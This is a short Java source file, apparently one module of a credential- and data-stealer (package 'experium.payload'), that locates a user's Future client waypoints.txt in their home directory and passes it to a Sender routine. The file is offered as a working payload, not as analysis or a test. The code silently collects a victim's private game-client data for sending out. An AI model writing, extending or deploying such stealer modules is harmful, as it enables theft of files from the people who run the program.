package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final
class FutureWaypoints implements Payload {
    @Override
    public
    void execute () {
        Optional <File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\" + "waypoints.txt");
        file.ifPresent(Sender::send);
    }
}